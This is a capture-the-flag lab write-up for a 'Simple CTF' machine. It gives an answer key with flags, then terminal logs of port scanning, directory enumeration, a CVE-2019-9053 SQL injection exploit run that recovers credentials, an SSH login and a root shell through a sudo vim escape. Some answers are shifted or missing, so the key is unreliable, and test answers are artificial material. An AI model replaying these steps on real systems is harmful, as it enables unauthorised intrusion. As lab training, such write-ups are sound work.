# Simple CTF

### 1. How many services are running under port 1000?
---

Answer : 2

---

### 2. What is running on the higher port?
---

Answer : ssh    

---
### 3. What's the CVE you're using against the application? 
---

Answer : CVE-2019-9053

---
### 4. To what kind of vulnerability is the application vulnerable?
---

Answer : sqli

---
### 5. What's the password?
---

Answer : secret

---
### 6. Where can you login with the details obtained?
---

Answer : ssh

---
### 7. What's the user flag?
---

Answer : G00d j0b, keep up!

---
### 8. Is there any other user in the home directory? What's its name?
---

Answer : 

---
### 9. What can you leverage to spawn a privileged shell?
---

Answer : sunbath

---
### 10. What can you leverage to spawn a privileged shell?
---

Answer : vim

---
### 11. What's the root flag?
---

Answer : W3ll d0n3. You made it!

---
## These are the commands and tools I used to complete this ctf
````shell
┌──(grimlock㉿GRIMLOCK)-[~/tryhackme/lol]
└─$ nmap -A -T4 10.10.99.133 -vv
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-01 22:05 IST
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 22:05
Completed NSE at 22:05, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 22:05
Completed NSE at 22:05, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 22:05
Completed NSE at 22:05, 0.00s elapsed
Initiating Ping Scan at 22:05
Scanning 10.10.99.133 [2 ports]
Completed Ping Scan at 22:05, 0.25s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 22:05
Completed Parallel DNS resolution of 1 host. at 22:05, 13.00s elapsed
Initiating Connect Scan at 22:05
Scanning 10.10.99.133 [1000 ports]
Discovered open port 80/tcp on 10.10.99.133
Discovered open port 21/tcp on 10.10.99.133
Discovered open port 2222/tcp on 10.10.99.133
Completed Connect Scan at 22:05, 21.15s elapsed (1000 total ports)

---snip---

PORT     STATE SERVICE REASON  VERSION
21/tcp   open  ftp     syn-ack vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.17.46.12
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
80/tcp   open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 2 disallowed entries 
|_/ /openemr-5_0_1_3 
2222/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCj5RwZ5K4QU12jUD81IxGPdEmWFigjRwFNM2pVBCiIPWiMb+R82pdw5dQPFY0JjjicSysFN3pl8ea2L8acocd/7zWke6ce50tpHaDs8OdBYLfpkh+OzAsDwVWSslgKQ7rbi/ck1FF1LIgY7UQdo5FWiTMap7vFnsT/WHL3HcG5Q+el4glnO4xfMMvbRar5WZd4N0ZmcwORyXrEKvulWTOBLcoMGui95Xy7XKCkvpS9RCpJgsuNZ/oau9cdRs0gDoDLTW4S7OI9Nl5obm433k+7YwFeoLnuZnCzegEhgq/bpMo+fXTb/4ILI5bJHJQItH2Ae26iMhJjlFsMqQw0FzLf
|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBM6Q8K/lDR5QuGRzgfrQSDPYBEBcJ+/2YolisuiGuNIF+1FPOweJy9esTtstZkG3LPhwRDggCp4BP+Gmc92I3eY=
|   256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ2I73yryK/Q6UFyvBBMUJEfznlIdBXfnrEqQ3lWdymK
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 22:06
Completed NSE at 22:06, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 22:06
Completed NSE at 22:06, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 22:06
Completed NSE at 22:06, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 74.25 seconds


````
```shell
┌──(grimlock㉿GRIMLOCK)-[~/tryhackme/lol]
└─$ gobuster dir -u http://10.10.99.133/ --wordlist /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.99.133/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/simple               (Status: 301) [Size: 313] [--> http://10.10.99.133/simple/]
Progress: 5427 / 87665 (6.19%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 5447 / 87665 (6.21%)
===============================================================
Finished
===============================================================
```
```shell
┌──(grimlock㉿GRIMLOCK)-[~/tryhackme/lol]
└─$ python exploit.py -u http://10.10.99.133/simple/ -w /usr/share/wordlists/rockyou.txt


[*] Try: 1

----snip----

[+] Salt for password found: 1dac0d92e9fa6a
[+] Username found: mitch@
[+] Email found: admin@admin.comH
[+] Password found: 0c01f4468bd75d7a84c7eb738467

```
```shell
┌──(grimlock㉿GRIMLOCK)-[~/tryhackme/lol]
└─$ ssh mitch@10.10.99.133 -p 2222
The authenticity of host '[10.10.99.133]:2222 ([10.10.99.133]:2222)' can't be established.
ED25519 key fingerprint is SHA256:iq4f0XcnA5nnPNAufEqOpvTbO8dOJPcHGgmeABEdQ5g.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.99.133]:2222' (ED25519) to the list of known hosts.
mitch@10.10.99.133's password: 
Permission denied, please try again.
mitch@10.10.99.133's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-58-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.

Last login: Mon Aug 19 18:13:41 2019 from 192.168.0.190

```
```shell
$ ls
user.txt
$ cat us
cat: us: No such file or directory
$ cat user.txt
G00d j0b, keep up!
```
```shell
$ sudo -l
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
$ vim -c ':!/bin/sh'

$ id     
uid=1001(mitch) gid=1001(mitch) groups=1001(mitch)

```
```shell
$ sudo vim -c ':!/bin/sh'

# id     
uid=0(root) gid=0(root) groups=0(root)
```
```shell
# cat root.txt
W3ll d0n3. You made it!
```